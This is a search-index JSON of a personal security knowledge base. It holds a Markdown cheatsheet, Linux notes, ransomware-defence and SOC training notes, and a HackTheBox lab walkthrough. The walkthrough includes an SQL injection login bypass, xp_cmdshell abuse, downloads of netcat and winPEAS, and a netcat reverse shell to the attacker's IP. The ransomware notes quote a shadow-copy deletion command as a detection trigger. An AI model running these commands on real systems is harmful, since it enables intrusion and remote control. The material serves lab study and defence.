{"config":{"indexing":"full","lang":["en"],"min_search_length":3,"prebuild_index":false,"separator":"[\\s\\-]+"},"docs":[{"location":"","text":"Welcome to Woby Woby is my knowledge database, built using MkDocs Material, in order to make it easy to search through, and accessible from anywhere in case I need it. Site Layout Markdown cheatsheet Practical ethical hacking Networking , Linux & Python basics Reconnaissance , Scanning & Enumeration Active Directory Exploitation & Buffer Overflows Web Application & Wireless pentesting Post-Exploitation & Report Writing Tools Nmap Hydra SQLite3 Internet of Things RFID TryHackMe knowledge HTTP XML","title":"Homepage"},{"location":"#welcome-to-woby","text":"Woby is my knowledge database, built using MkDocs Material, in order to make it easy to search through, and accessible from anywhere in case I need it.","title":"Welcome to Woby"},{"location":"#site-layout","text":"Markdown cheatsheet Practical ethical hacking Networking , Linux & Python basics Reconnaissance , Scanning & Enumeration Active Directory Exploitation & Buffer Overflows Web Application & Wireless pentesting Post-Exploitation & Report Writing Tools Nmap Hydra SQLite3 Internet of Things RFID TryHackMe knowledge HTTP XML","title":"Site Layout"},{"location":"md_cheatsheet/","text":"Markdown cheatsheet 1. Formatting _Italic_ *Italic* __Bold__ **Bold** _You **can** combine them_ ~~Strikethrough~~ Example<sup>superscript</sup> Example<sub>subscript</sub> Italic Italic Bold Bold You can combine them Strikethrough Example superscript Example subscript 2. Lists Unordered lists - Unordered list + Unordered list * Unordered list - Nested - Unordered - List Unordered list Unordered list Unordered list Nested Unordered List Ordered lists 1. Ordered list 2. Ordered list 3. Nested 1. Ordered 2. List Ordered list Ordered list Nested Ordered List 3. Tasks + [x] #tags , [links](), **formatting** supported * [x] list syntax required (any unordered or ordered list supported) - [x] this is a complete item - [ ] this is an incomplete item - [ ] tasks can be clicked in Preview to be checked off - [ ] nested tasks #tags, links , formatting supported list syntax required (any unordered or ordered list supported) this is a complete item this is an incomplete item tasks can be clicked in Preview to be checked off nested tasks 4. Links 4.1. External links <https://obsidian.md> <other@fake.mail> https://obsidian.md other@fake.mail 4.2. Internal links [ Networking ]( <practical_ethical_hacking/peh-networking.md> ) Networking 5. Images Local picture with caption <figure> <img src=\"../images/argald0_logo.png\" width=\"300\" /> <figcaption>My logo caption</figcaption> </figure> My logo caption Online picture aligned right ![ Image ]( <https://full/path/to/picture> ){align=right} 6. Tables header 1|header 2|header 3 :---|:---:|---: -|-|- align left | center | align right header 1 header 2 header 3 - - - align left center align right 7. Math $\\varphi^{\\theta\\to2}_{3}$ $\\begin{vmatrix}a & b\\\\ c & d \\end{vmatrix}=ad-bc$ $\\frac{\\frac{x}{1}}{x - y}$ \\(\\varphi^{\\theta\\to2}_{3}\\) \\(\\begin{vmatrix}a & b\\\\ c & d \\end{vmatrix}=ad-bc\\) \\(\\frac{\\frac{x}{1}}{x - y}\\) 8. Blockquotes > Tu ne sais pas ce que le futur nous attend. \\- Massian Chakir, 2015 Tu ne sais pas ce que le futur nous attend. - Massian Chakir, 2015 9. Code 9.1. Inline code Text inside `backticks` on a line will be formatted like code. Text inside backticks on a line will be formatted like code. 9.2. Code blocks ``` python linenums=\"2\" hl_lines=\"2 4\" def bubble_sort(items): for i in range(len(items)): for j in range(len(items) - 1 - i): if items[j] > items[j + 1]: items[j], items[j + 1] = items[j + 1], items[j] ``` 2 3 4 5 6 def bubble_sort ( items ): for i in range ( len ( items )): for j in range ( len ( items ) - 1 - i ): if items [ j ] > items [ j + 1 ]: items [ j ], items [ j + 1 ] = items [ j + 1 ], items [ j ] 9.3. Indented text Text indented with a tab is formatted like this, and will also look like a code block in preview. Text indented with a tab is formatted like this, and will also look like a code block in preview. 9.4. Tabbed Codeblocks === \"C\" ``` c #include <stdio.h> int main(void) { printf(\"Hello world!\\n\"); return 0; } ``` === \"C++\" ``` c++ #include <iostream> int main(void) { std::cout << \"Hello world!\" << std::endl; return 0; } ``` Tabbed Codeblocks C #include <stdio.h> int main ( void ) { printf ( \"Hello world! \\n \" ); return 0 ; } C++ #include <iostream> int main ( void ) { std :: cout << \"Hello world!\" << std :: endl ; return 0 ; } 10. Admonition !!! note \"Phasellus posuere in sem ut cursus\" Lorem ipsum dolor sit amet, consectetur adipiscing elit. Nulla et euismod nulla. Curabitur feugiat, tortor non consequat finibus, justo purus auctor massa, nec semper lorem quam in massa. Phasellus posuere in sem ut cursus Lorem ipsum dolor sit amet, consectetur adipiscing elit. Nulla et euismod nulla. Curabitur feugiat, tortor non consequat finibus, justo purus auctor massa, nec semper lorem quam in massa. 11. Pagebreak < div style = \"page-break-after: always;\" ></ div > \\(\\infty\\) . Source Writing Mathematic Fomulars in Markdown Obsidian official page : Format your notes Mermaid JS : Sequence Diagram","title":"Markdown cheatsheet"},{"location":"md_cheatsheet/#markdown-cheatsheet","text":"","title":"Markdown cheatsheet"},{"location":"md_cheatsheet/#1-formatting","text":"_Italic_ *Italic* __Bold__ **Bold** _You **can** combine them_ ~~Strikethrough~~ Example<sup>superscript</sup> Example<sub>subscript</sub> Italic Italic Bold Bold You can combine them Strikethrough Example superscript Example subscript","title":"1. Formatting"},{"location":"md_cheatsheet/#2-lists","text":"Unordered lists - Unordered list + Unordered list * Unordered list - Nested - Unordered - List Unordered list Unordered list Unordered list Nested Unordered List Ordered lists 1. Ordered list 2. Ordered list 3. Nested 1. Ordered 2. List Ordered list Ordered list Nested Ordered List","title":"2. Lists"},{"location":"md_cheatsheet/#3-tasks","text":"+ [x] #tags , [links](), **formatting** supported * [x] list syntax required (any unordered or ordered list supported) - [x] this is a complete item - [ ] this is an incomplete item - [ ] tasks can be clicked in Preview to be checked off - [ ] nested tasks #tags, links , formatting supported list syntax required (any unordered or ordered list supported) this is a complete item this is an incomplete item tasks can be clicked in Preview to be checked off nested tasks","title":"3. Tasks"},{"location":"md_cheatsheet/#4-links","text":"","title":"4. Links"},{"location":"md_cheatsheet/#41-external-links","text":"<https://obsidian.md> <other@fake.mail> https://obsidian.md other@fake.mail","title":"4.1. External links"},{"location":"md_cheatsheet/#42-internal-links","text":"[ Networking ]( <practical_ethical_hacking/peh-networking.md> ) Networking","title":"4.2. Internal links"},{"location":"md_cheatsheet/#5-images","text":"Local picture with caption <figure> <img src=\"../images/argald0_logo.png\" width=\"300\" /> <figcaption>My logo caption</figcaption> </figure> My logo caption Online picture aligned right ![ Image ]( <https://full/path/to/picture> ){align=right}","title":"5. Images"},{"location":"md_cheatsheet/#6-tables","text":"header 1|header 2|header 3 :---|:---:|---: -|-|- align left | center | align right header 1 header 2 header 3 - - - align left center align right","title":"6. Tables"},{"location":"md_cheatsheet/#7-math","text":"$\\varphi^{\\theta\\to2}_{3}$ $\\begin{vmatrix}a & b\\\\ c & d \\end{vmatrix}=ad-bc$ $\\frac{\\frac{x}{1}}{x - y}$ \\(\\varphi^{\\theta\\to2}_{3}\\) \\(\\begin{vmatrix}a & b\\\\ c & d \\end{vmatrix}=ad-bc\\) \\(\\frac{\\frac{x}{1}}{x - y}\\)","title":"7. Math"},{"location":"md_cheatsheet/#8-blockquotes","text":"> Tu ne sais pas ce que le futur nous attend. \\- Massian Chakir, 2015 Tu ne sais pas ce que le futur nous attend. - Massian Chakir, 2015","title":"8. Blockquotes"},{"location":"md_cheatsheet/#9-code","text":"","title":"9. Code"},{"location":"md_cheatsheet/#91-inline-code","text":"Text inside `backticks` on a line will be formatted like code. Text inside backticks on a line will be formatted like code.","title":"9.1. Inline code"},{"location":"md_cheatsheet/#92-code-blocks","text":"``` python linenums=\"2\" hl_lines=\"2 4\" def bubble_sort(items): for i in range(len(items)): for j in range(len(items) - 1 - i): if items[j] > items[j + 1]: items[j], items[j + 1] = items[j + 1], items[j] ``` 2 3 4 5 6 def bubble_sort ( items ): for i in range ( len ( items )): for j in range ( len ( items ) - 1 - i ): if items [ j ] > items [ j + 1 ]: items [ j ], items [ j + 1 ] = items [ j + 1 ], items [ j ]","title":"9.2. Code blocks"},{"location":"md_cheatsheet/#93-indented-text","text":"Text indented with a tab is formatted like this, and will also look like a code block in preview. Text indented with a tab is formatted like this, and will also look like a code block in preview.","title":"9.3. Indented text"},{"location":"md_cheatsheet/#94-tabbed-codeblocks","text":"=== \"C\" ``` c #include <stdio.h> int main(void) { printf(\"Hello world!\\n\"); return 0; } ``` === \"C++\" ``` c++ #include <iostream> int main(void) { std::cout << \"Hello world!\" << std::endl; return 0; } ``` Tabbed Codeblocks C #include <stdio.h> int main ( void ) { printf ( \"Hello world! \\n \" ); return 0 ; } C++ #include <iostream> int main ( void ) { std :: cout << \"Hello world!\" << std :: endl ; return 0 ; }","title":"9.4. Tabbed Codeblocks"},{"location":"md_cheatsheet/#10-admonition","text":"!!! note \"Phasellus posuere in sem ut cursus\" Lorem ipsum dolor sit amet, consectetur adipiscing elit. Nulla et euismod nulla. Curabitur feugiat, tortor non consequat finibus, justo purus auctor massa, nec semper lorem quam in massa. Phasellus posuere in sem ut cursus Lorem ipsum dolor sit amet, consectetur adipiscing elit. Nulla et euismod nulla. Curabitur feugiat, tortor non consequat finibus, justo purus auctor massa, nec semper lorem quam in massa.","title":"10. Admonition"},{"location":"md_cheatsheet/#11-pagebreak","text":"< div style = \"page-break-after: always;\" ></ div >","title":"11. Pagebreak"},{"location":"md_cheatsheet/#infty-source","text":"Writing Mathematic Fomulars in Markdown Obsidian official page : Format your notes Mermaid JS : Sequence Diagram","title":"\\(\\infty\\). Source"},{"location":"random-knowledge/","text":"Random knowledge Virtualization Virtualbox Fullscreen On guest machine: $ sudo apt-get update $ sudo apt-get install -y virtualbox-guest-utils virtualbox-guest-x11 $ reboot Fullscreen Debian 11 Bullseye On Virtualbox: Devices > Insert Guest Additions CD image On Guest: $ sudo mount /dev/cdrom /mnt $ ls -1 /mnt AUTORUN.INF autorun.sh cert NT3x OS2 runasroot.sh TRANS.TBL VBoxDarwinAdditions.pkg VBoxDarwinAdditionsUninstall.tool VBoxLinuxAdditions.run VBoxSolarisAdditions.pkg VBoxWindowsAdditions-amd64.exe VBoxWindowsAdditions.exe VBoxWindowsAdditions-x86.exe $ sudo apt update -y && sudo apt upgrade $ sudo apt install dkms linux-headers- $( uname -r ) build-essential #Required packages $ sudo sh /mnt/VBoxLinuxAdditions.run $ systemctl reboot -i To uninstall the guest additions run : sudo sh /mnt/VBoxLinuxAdditions.run uninstall Useful aliases and functions *For zsh, add source $HOME/.aliases in the .zshrc file` # create a folder and immediately get in: mkcd () { mkdir -p -- \" $1 \" && cd -P -- \" $1 \" } seurch () { cat ~/.bash_history | grep \" $1 \" } alias .. = 'cd ../' alias ... = 'cd ../../' alias .... = 'cd ../../../' alias ..... = 'cd ../../../../' alias ip = 'ip --color' Disks details on Linux Disk information lsblk -l source Manual package installation Debian sudo dpkg -i package_name.deb Add user to sudoers usermod -aG sudo username udp scan : sudo nmap -sU -sV - 10.10.11.124 --min-rate 7500 -F","title":"Random Knowledge"},{"location":"random-knowledge/#random-knowledge","text":"","title":"Random knowledge"},{"location":"random-knowledge/#virtualization","text":"","title":"Virtualization"},{"location":"random-knowledge/#virtualbox","text":"","title":"Virtualbox"},{"location":"random-knowledge/#fullscreen","text":"On guest machine: $ sudo apt-get update $ sudo apt-get install -y virtualbox-guest-utils virtualbox-guest-x11 $ reboot","title":"Fullscreen"},{"location":"random-knowledge/#fullscreen-debian-11-bullseye","text":"On Virtualbox: Devices > Insert Guest Additions CD image On Guest: $ sudo mount /dev/cdrom /mnt $ ls -1 /mnt AUTORUN.INF autorun.sh cert NT3x OS2 runasroot.sh TRANS.TBL VBoxDarwinAdditions.pkg VBoxDarwinAdditionsUninstall.tool VBoxLinuxAdditions.run VBoxSolarisAdditions.pkg VBoxWindowsAdditions-amd64.exe VBoxWindowsAdditions.exe VBoxWindowsAdditions-x86.exe $ sudo apt update -y && sudo apt upgrade $ sudo apt install dkms linux-headers- $( uname -r ) build-essential #Required packages $ sudo sh /mnt/VBoxLinuxAdditions.run $ systemctl reboot -i To uninstall the guest additions run : sudo sh /mnt/VBoxLinuxAdditions.run uninstall","title":"Fullscreen Debian 11 Bullseye"},{"location":"random-knowledge/#useful-aliases-and-functions","text":"*For zsh, add source $HOME/.aliases in the .zshrc file` # create a folder and immediately get in: mkcd () { mkdir -p -- \" $1 \" && cd -P -- \" $1 \" } seurch () { cat ~/.bash_history | grep \" $1 \" } alias .. = 'cd ../' alias ... = 'cd ../../' alias .... = 'cd ../../../' alias ..... = 'cd ../../../../' alias ip = 'ip --color'","title":"Useful aliases and functions"},{"location":"random-knowledge/#disks-details-on-linux","text":"","title":"Disks details on Linux"},{"location":"random-knowledge/#disk-information","text":"lsblk -l source","title":"Disk information"},{"location":"random-knowledge/#manual-package-installation","text":"","title":"Manual package installation"},{"location":"random-knowledge/#debian","text":"sudo dpkg -i package_name.deb","title":"Debian"},{"location":"random-knowledge/#add-user-to-sudoers","text":"usermod -aG sudo username udp scan : sudo nmap -sU -sV - 10.10.11.124 --min-rate 7500 -F","title":"Add user to sudoers"},{"location":"black_hills_information_security/bhis-ransomware/","text":"Emergency Webcast : Ransomware! 1. Recent attacks Colonial pipeline attack : DarkSide was able to target a pipeline that transports over 100 gallons of fuel daily. 2. Deception Deception is ESSENTIAL ! Attackers are still getting through the high-end EDR products, or just password spraying in order to gain access to the environment... We spend so much time trying to secure the endpoint that we started to ignore that companies are still getting compromised. Those security products are all going to fail, then what ? We need to be looking at the attack pathways post-exploitation : password spraying ? kerberoasting ? etc... Attackers use the usual RedTeam methods ! 3. Three types of ransomware 3.1. Encrypt OS One of the first types that come to mind when we think about ransomware is the kind that encrypts the whole Operating System 3.2. Encrypt Files The other super famous kind is the one encrypting the files, not the whole workstation. 3.3. Blackmail stolen data Last but not least, the kind where the company was stolen important files (potentially life or death situations), and the bad guys are blackmailing the company in order not to release the information. 4. Detection/Prevention tools CanaryTokens Amazing tool to notice an attacker on your network. When you trigger the honeydoc, it can send you an alert, give you the IP address, even get the name of the machine, the credentials of the account connected on it, realize a traceroute, get the exact position of the attacker... It can be put on : shares compromised systems websites (Robots.txt) Email to spammers! When an attacker pops a box, they try to pivot in order to gather more information, trying to find information in doc files... let them find your password.docx ! https://github.com/thinkst/canarytokens Honeyaccount Make sure to login to the account at least once Disable the logon hours (in order to make it effectively disabled ) Put an easy but really long password , last changed long ago Add a rule to trigger an alert as soon as someone tries to use this account ! RITA BHIS' tool RITA : it can detect Command and Control in an hour ! https://www.activecountermeasures.com/free-tools/rita/ CredDefense toolkit The tool can create kerberoasting cyber detection, because every attacker will try to pivot and escalate by doing kerberoasting. https://github.com/CredDefense/CredDefense Raccine Raccine can detect when an attacker tries to delete the windows shadow copies. It intercepts the request and kills the invoking process. triggers with : vssadmin.exe... vssadmin.exe delete shadows /all /quiet or wmic.exe... https://github.com/Neo23x0/Raccine Ransomware protection in Windows Security Windows has an integrated tool to prevent ransomware attacks. 5. Ransomware procedure \"According to IBM X-Force, the malware, once deployed, steals data, encrypts systems using Salsa20 and RSA-1024 encryption protocols, and executes an encoded PowerShell command to delete volume shadow copies.\" Hence Raccine","title":"Ransomware Emergency Webcast"},{"location":"black_hills_information_security/bhis-ransomware/#emergency-webcast-ransomware","text":"","title":"Emergency Webcast : Ransomware!"},{"location":"black_hills_information_security/bhis-ransomware/#1-recent-attacks","text":"Colonial pipeline attack : DarkSide was able to target a pipeline that transports over 100 gallons of fuel daily.","title":"1. Recent attacks"},{"location":"black_hills_information_security/bhis-ransomware/#2-deception","text":"Deception is ESSENTIAL ! Attackers are still getting through the high-end EDR products, or just password spraying in order to gain access to the environment... We spend so much time trying to secure the endpoint that we started to ignore that companies are still getting compromised. Those security products are all going to fail, then what ? We need to be looking at the attack pathways post-exploitation : password spraying ? kerberoasting ? etc... Attackers use the usual RedTeam methods !","title":"2. Deception"},{"location":"black_hills_information_security/bhis-ransomware/#3-three-types-of-ransomware","text":"","title":"3. Three types of ransomware"},{"location":"black_hills_information_security/bhis-ransomware/#31-encrypt-os","text":"One of the first types that come to mind when we think about ransomware is the kind that encrypts the whole Operating System","title":"3.1. Encrypt OS"},{"location":"black_hills_information_security/bhis-ransomware/#32-encrypt-files","text":"The other super famous kind is the one encrypting the files, not the whole workstation.","title":"3.2. Encrypt Files"},{"location":"black_hills_information_security/bhis-ransomware/#33-blackmail-stolen-data","text":"Last but not least, the kind where the company was stolen important files (potentially life or death situations), and the bad guys are blackmailing the company in order not to release the information.","title":"3.3. Blackmail stolen data"},{"location":"black_hills_information_security/bhis-ransomware/#4-detectionprevention-tools","text":"CanaryTokens Amazing tool to notice an attacker on your network. When you trigger the honeydoc, it can send you an alert, give you the IP address, even get the name of the machine, the credentials of the account connected on it, realize a traceroute, get the exact position of the attacker... It can be put on : shares compromised systems websites (Robots.txt) Email to spammers! When an attacker pops a box, they try to pivot in order to gather more information, trying to find information in doc files... let them find your password.docx ! https://github.com/thinkst/canarytokens Honeyaccount Make sure to login to the account at least once Disable the logon hours (in order to make it effectively disabled ) Put an easy but really long password , last changed long ago Add a rule to trigger an alert as soon as someone tries to use this account ! RITA BHIS' tool RITA : it can detect Command and Control in an hour ! https://www.activecountermeasures.com/free-tools/rita/ CredDefense toolkit The tool can create kerberoasting cyber detection, because every attacker will try to pivot and escalate by doing kerberoasting. https://github.com/CredDefense/CredDefense Raccine Raccine can detect when an attacker tries to delete the windows shadow copies. It intercepts the request and kills the invoking process. triggers with : vssadmin.exe... vssadmin.exe delete shadows /all /quiet or wmic.exe... https://github.com/Neo23x0/Raccine Ransomware protection in Windows Security Windows has an integrated tool to prevent ransomware attacks.","title":"4. Detection/Prevention tools"},{"location":"black_hills_information_security/bhis-ransomware/#5-ransomware-procedure","text":"\"According to IBM X-Force, the malware, once deployed, steals data, encrypts systems using Salsa20 and RSA-1024 encryption protocols, and executes an encoded PowerShell command to delete volume shadow copies.\" Hence Raccine","title":"5. Ransomware procedure"},{"location":"black_hills_information_security/soc_training/bhis-endpoint_analysis/","text":"Endpoint analysis Tools : DeepBlueCLI You feed it with event logs while powershell logging is enabled and it will automatically detect attacks.","title":"Endpoint analysis"},{"location":"black_hills_information_security/soc_training/bhis-endpoint_analysis/#endpoint-analysis","text":"","title":"Endpoint analysis"},{"location":"black_hills_information_security/soc_training/bhis-endpoint_analysis/#tools","text":"DeepBlueCLI You feed it with event logs while powershell logging is enabled and it will automatically detect attacks.","title":"Tools :"},{"location":"black_hills_information_security/soc_training/bhis-intro/","text":"SOC Core Skills Training 1 Summary What are we going to cover ? Intro to Windows Intro to Linux Intro to TCP/IP Basics & fundamentals Core things to learn to work at the BHIS SOC This class is meant to feed into the Intro to Security class What to do on a bad day ? You need a plan ! Plans are useless, planning is indispensible Don't panic ! 2 Let's start with Windows First things to do network connections : - netstat - netview - net use - net session run cmd as admin 2.1 Network Connections 2.1.1 C:\\> net view allows to look at shares attackers like to set shares as staging areas inside of a network pull files to one location and then exfil out what is normal ? If you're a SOC analyst and if there is a net command firing, it's an attacker trying to mount shares 2.1.2 C:\\> net session who is currently talking to the current system ? need to see this as a chain 2.1.3 C:\\> net use who is the system talking to ? opposite of net session 2.1.4 C:\\> netstat lots of flags shows network connections 2.1.4.1 C:\\> netstat -naob Shows all TCP and UDP connections : - -a : all ports - -n : what port ? - -o : what Process ID ? - -b : what exe ? PID 4 = system process 2.1.4.2 C:\\> netstat -f fully qualified name 2.2 Windows Processes After checking the network connections we need to check the processes 2.2.1 C:\\> takslist /svc Allows to check if the svchosts are legit 2.2.2 C:\\> tasklist /m Dumps all DLLs used by each process - tasklist /m \\<dll name> : to check what uses that one dll - tasklist /m /fi \"pid eq \\ \" Dr Cole's 3 metrics top 10 with, 1. most # of connections, 2. longest duration connections, 3. largest size connections. PlumHound & PingCastle","title":"Intro"},{"location":"black_hills_information_security/soc_training/bhis-intro/#soc-core-skills-training","text":"","title":"SOC Core Skills Training"},{"location":"black_hills_information_security/soc_training/bhis-intro/#1-summary","text":"What are we going to cover ? Intro to Windows Intro to Linux Intro to TCP/IP Basics & fundamentals Core things to learn to work at the BHIS SOC This class is meant to feed into the Intro to Security class","title":"1 Summary"},{"location":"black_hills_information_security/soc_training/bhis-intro/#what-to-do-on-a-bad-day","text":"You need a plan ! Plans are useless, planning is indispensible Don't panic !","title":"What to do on a bad day ?"},{"location":"black_hills_information_security/soc_training/bhis-intro/#2-lets-start-with-windows","text":"First things to do network connections : - netstat - netview - net use - net session run cmd as admin","title":"2 Let's start with Windows"},{"location":"black_hills_information_security/soc_training/bhis-intro/#21-network-connections","text":"","title":"2.1 Network Connections"},{"location":"black_hills_information_security/soc_training/bhis-intro/#211-c-net-view","text":"allows to look at shares attackers like to set shares as staging areas inside of a network pull files to one location and then exfil out what is normal ? If you're a SOC analyst and if there is a net command firing, it's an attacker trying to mount shares","title":"2.1.1 C:\\&gt; net view"},{"location":"black_hills_information_security/soc_training/bhis-intro/#212-c-net-session","text":"who is currently talking to the current system ? need to see this as a chain","title":"2.1.2 C:\\&gt; net session"},{"location":"black_hills_information_security/soc_training/bhis-intro/#213-c-net-use","text":"who is the system talking to ? opposite of net session","title":"2.1.3 C:\\&gt; net use"},{"location":"black_hills_information_security/soc_training/bhis-intro/#214-c-netstat","text":"lots of flags shows network connections","title":"2.1.4 C:\\&gt; netstat"},{"location":"black_hills_information_security/soc_training/bhis-intro/#2141-c-netstat-naob","text":"Shows all TCP and UDP connections : - -a : all ports - -n : what port ? - -o : what Process ID ? - -b : what exe ? PID 4 = system process","title":"2.1.4.1 C:\\&gt; netstat -naob"},{"location":"black_hills_information_security/soc_training/bhis-intro/#2142-c-netstat-f","text":"fully qualified name","title":"2.1.4.2 C:\\&gt; netstat -f"},{"location":"black_hills_information_security/soc_training/bhis-intro/#22-windows-processes","text":"After checking the network connections we need to check the processes","title":"2.2 Windows Processes"},{"location":"black_hills_information_security/soc_training/bhis-intro/#221-c-takslist-svc","text":"Allows to check if the svchosts are legit","title":"2.2.1 C:\\&gt; takslist /svc"},{"location":"black_hills_information_security/soc_training/bhis-intro/#222-c-tasklist-m","text":"Dumps all DLLs used by each process - tasklist /m \\<dll name> : to check what uses that one dll - tasklist /m /fi \"pid eq \\ \"","title":"2.2.2 C:\\&gt; tasklist /m"},{"location":"black_hills_information_security/soc_training/bhis-intro/#dr-coles-3-metrics","text":"top 10 with, 1. most # of connections, 2. longest duration connections, 3. largest size connections. PlumHound & PingCastle","title":"Dr Cole's 3 metrics"},{"location":"black_hills_information_security/soc_training/bhis-linux/","text":"Titlke Ping, pong, parse... ping : ping port : lsof -i -P Friendly Interactive SHell FISH is a tool that makes using CLI easier LinuxCLI","title":"Linux"},{"location":"black_hills_information_security/soc_training/bhis-linux/#titlke","text":"","title":"Titlke"},{"location":"black_hills_information_security/soc_training/bhis-linux/#ping-pong-parse","text":"ping : ping port : lsof -i -P","title":"Ping, pong, parse..."},{"location":"black_hills_information_security/soc_training/bhis-linux/#friendly-interactive-shell","text":"FISH is a tool that makes using CLI easier","title":"Friendly Interactive SHell"},{"location":"black_hills_information_security/soc_training/bhis-linux/#linuxcli","text":"","title":"LinuxCLI"},{"location":"black_hills_information_security/soc_training/bhis-windows/","text":"Let's start with Windows First things to do network connections : - netstat - netview - net use - net session run cmd as admin 1 Network Connections 1.1 C:\\> net view allows to look at shares attackers like to set shares as staging areas inside of a network pull files to one location and then exfil out what is normal ? If you're a SOC analyst and if there is a net command firing, it's an attacker trying to mount shares Helps detect an attacker that is mounting shares on other computers. 1.2 C:\\> net session who is currently talking to the current system ? need to see this as a chain Tells if an attacker had mounted a share on this system. 1.3 C:\\> net use who is the system talking to ? opposite of net session 1.4 C:\\> netstat lots of flags shows network connections 1.4.1 C:\\> netstat -naob Shows all TCP and UDP connections : - -a : all ports - -n : what port ? - -o : what Process ID ? - -b : what exe ? PID 4 = system process 1.4.2 C:\\> netstat -f fully qualified name 2 Windows Processes After checking the network connections we need to check the processes 2.2.1 C:\\> takslist /svc Allows to check if the svchosts are legit 2.2.2 C:\\> tasklist /m Dumps all DLLs used by each process - tasklist /m \\<dll name> : to check what uses that one dll - tasklist /m /fi \"pid eq \\ \"","title":"Windows"},{"location":"black_hills_information_security/soc_training/bhis-windows/#lets-start-with-windows","text":"First things to do network connections : - netstat - netview - net use - net session run cmd as admin","title":"Let's start with Windows"},{"location":"black_hills_information_security/soc_training/bhis-windows/#1-network-connections","text":"","title":"1 Network Connections"},{"location":"black_hills_information_security/soc_training/bhis-windows/#11-c-net-view","text":"allows to look at shares attackers like to set shares as staging areas inside of a network pull files to one location and then exfil out what is normal ? If you're a SOC analyst and if there is a net command firing, it's an attacker trying to mount shares Helps detect an attacker that is mounting shares on other computers.","title":"1.1 C:\\&gt; net view"},{"location":"black_hills_information_security/soc_training/bhis-windows/#12-c-net-session","text":"who is currently talking to the current system ? need to see this as a chain Tells if an attacker had mounted a share on this system.","title":"1.2 C:\\&gt; net session"},{"location":"black_hills_information_security/soc_training/bhis-windows/#13-c-net-use","text":"who is the system talking to ? opposite of net session","title":"1.3 C:\\&gt; net use"},{"location":"black_hills_information_security/soc_training/bhis-windows/#14-c-netstat","text":"lots of flags shows network connections","title":"1.4 C:\\&gt; netstat"},{"location":"black_hills_information_security/soc_training/bhis-windows/#141-c-netstat-naob","text":"Shows all TCP and UDP connections : - -a : all ports - -n : what port ? - -o : what Process ID ? - -b : what exe ? PID 4 = system process","title":"1.4.1 C:\\&gt; netstat -naob"},{"location":"black_hills_information_security/soc_training/bhis-windows/#142-c-netstat-f","text":"fully qualified name","title":"1.4.2 C:\\&gt; netstat -f"},{"location":"black_hills_information_security/soc_training/bhis-windows/#2-windows-processes","text":"After checking the network connections we need to check the processes","title":"2 Windows Processes"},{"location":"black_hills_information_security/soc_training/bhis-windows/#221-c-takslist-svc","text":"Allows to check if the svchosts are legit","title":"2.2.1 C:\\&gt; takslist /svc"},{"location":"black_hills_information_security/soc_training/bhis-windows/#222-c-tasklist-m","text":"Dumps all DLLs used by each process - tasklist /m \\<dll name> : to check what uses that one dll - tasklist /m /fi \"pid eq \\ \"","title":"2.2.2 C:\\&gt; tasklist /m"},{"location":"htb/htb-starting_point/","text":"HackTheBox : Starting Point Meow Enumeration: Nmap: $ nmap -v -A -T4 <IP> --> telnet : 23/tcp Exploitation: telnet: $ telnet <IP> --> User : root Flag: $ cat flag.txt Fawn Enumeration: 1.Nmap: $ nmap -v -A -T4 <IP> --> ftp-anon : 21/tcp Exploitation: ftp: $ ftp <IP> --> user : Anonymous / password : Flag: ftp> get flag.txt --> download file Dancing Enumeration: Nmap: $ nmap -v -A -T4 <IP> --> smb : 445/tcp Exploitation: smbclient: $ smbclient -L <IP> --> list the available shares smbclient: $ smbclient -N \\\\\\\\<IP>\\\\<share> --> connect to share -N = no auth Flag: smb: \\> get flag.txt --> download file Appointment Enumeration: Nmap: $ nmap -v -A -T4 <IP> --> Apache/2.4.38 (Debian) : 80/tcp Exploitation: SQLi: username = admin & password = ' OR 1=1 # Flag: Displayed onscreen. Sequel Enumeration: Nmap: $ nmap -v -A -T4 <IP> --> mysql : 3306/tcp Exploitation: mysql: $ mysql -h <IP> -u root mysql: MariaDB [(none)]> SHOW databases; mysql: MariaDB [(none)]> USE htb; mysql: MariaDB [(htb)]> SHOW tables; mysql: MariaDB [(htb)]> SELECT * FROM config; Flag: Read from table. Crocodile Enumeration: Nmap: $ nmap -v -A -T4 <IP> --> ftp-anon : 21/tcp && Apache/2.4.41 (Ubuntu) : 80/tcp Exploitation: ftp: $ ftp <IP> --> user : Anonymous / password : ftp: ftp> dir --> list all files available ftp: ftp> get allowed.userlist --> download file ftp: ftp> get allowed.userlist.passwd --> download file dirsearch: $ dirsearch -u http://<IP>/ --> found /login.php page Use creds found in both files Flag: Displayed onscreen. Archetype Enumeration: Nmap: $ nmap -v -A -T4 <IP> --> smb : 445/tcp && mssql : 1433/tcp Exploitation: smbclient: $ smbclient -L <IP> --> list the available shares smbclient: $ smbclient -N \\\\\\\\<IP>\\\\<share> --> connect to share -N = no auth smbclient: smb: \\> get prod.dtsConfig --> credentials found in file impacket-mssqlclient: $ impacket-mssqlclient ARCHETYPE/sql_svc:<password>@<IP> -windows-auth --> connect to mssql MSSQL: SQL> enable_xp_cmdshell; --> enable xp_cmdshell to run commands MSSQL: SQL> RECONFIGURE; MSSQL: SQL> xp_cmdshell \"powershell -c cd C:\\Users\\sql_svc\\Downloads; wget <link to netcat executable> -outfile nc64.exe --> download netcat in folder where we have enough privileges (downloads) netcat: nc -nvlp 4444 --> netcat listening on our machine MSSQL: SQL> xp_cmdshell \"powershell -c cd C:\\Users\\sql_svc\\Downloads; .\\nc64.exe -e cmd.exe <MyIP> 4444 --> target machine is connecting to our listening netcat, and will run through cmd.exe everythin our netcat sends, to send it back to us netcat->cmd: C:\\Users\\sql_svc\\Downloads>powershell --> listening netcat is now a powershell shell netcat->powershell: PS> wget <link to winpeas executable> -outfile winPEASx64.exe --> download winPEAS on target machine","title":"Starting Point"},{"location":"htb/htb-starting_point/#hackthebox-starting-point","text":"","title":"HackTheBox : Starting Point"},{"location":"htb/htb-starting_point/#meow","text":"Enumeration: Nmap: $ nmap -v -A -T4 <IP> --> telnet : 23/tcp Exploitation: telnet: $ telnet <IP> --> User : root Flag: $ cat flag.txt","title":"Meow"},{"location":"htb/htb-starting_point/#fawn","text":"Enumeration: 1.Nmap: $ nmap -v -A -T4 <IP> --> ftp-anon : 21/tcp Exploitation: ftp: $ ftp <IP> --> user : Anonymous / password : Flag: ftp> get flag.txt --> download file","title":"Fawn"},{"location":"htb/htb-starting_point/#dancing","text":"Enumeration: Nmap: $ nmap -v -A -T4 <IP> --> smb : 445/tcp Exploitation: smbclient: $ smbclient -L <IP> --> list the available shares smbclient: $ smbclient -N \\\\\\\\<IP>\\\\<share> --> connect to share -N = no auth Flag: smb: \\> get flag.txt --> download 